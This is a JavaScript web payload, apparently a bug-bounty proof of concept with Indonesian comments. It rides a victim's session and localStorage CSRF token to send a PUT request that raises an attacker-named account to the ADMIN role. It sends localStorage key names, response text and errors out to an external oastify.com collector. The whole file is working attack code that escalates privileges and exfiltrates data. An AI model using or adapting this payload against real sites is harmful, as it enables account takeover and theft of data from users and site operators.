// Ambil CSRF token dari localStorage terlebih dahulu
const csrfToken = localStorage.getItem('csrfToken');

if (!csrfToken) {
    // Debug: cek semua localStorage keys
    const keys = Object.keys(localStorage);
    fetch('//vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/log?ls=' + encodeURIComponent(keys.join(',')));
    return;
}

// Sekarang pakai token untuk request dengan header X-Csrf-Token
fetch('/web/internal/v1/users/current', {
    credentials: 'include',
    headers: {
        'X-Csrf-Token': csrfToken,
        'Accept': 'application/json'
    }
})
.then(r => {
    if (!r.ok) throw new Error('status:' + r.status);
    return r.json();
})
.then(d => {
    // Gunakan token yang sama (atau dari response kalau ada)
    const token = d.csrfToken || d.token || csrfToken;
    
    // Request jadikan ADMIN
    return fetch('/web/api2/v3/users/yD6g4rpcvcbp9JCazqrxk1', {
        method: 'PUT',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json',
            'X-Csrf-Token': token
        },
        body: JSON.stringify({
            firstName: "evil",
            lastName: "cathack",
            email: "aydilfhr+evil@intigriti.me",
            userName: "aydilfhr+evil",
            role: "ADMIN",
            timezone: "Europe/London",
            active: true,
            note: ""
        })
    });
})
.then(r => r.text())
.then(t => {
    // Success log
    fetch('//vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/log?ok=1&resp=' + encodeURIComponent(t.substring(0, 200)));
})
.catch(e => {
    // Error log
    fetch('//vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/log?err=' + encodeURIComponent(e.message));
});
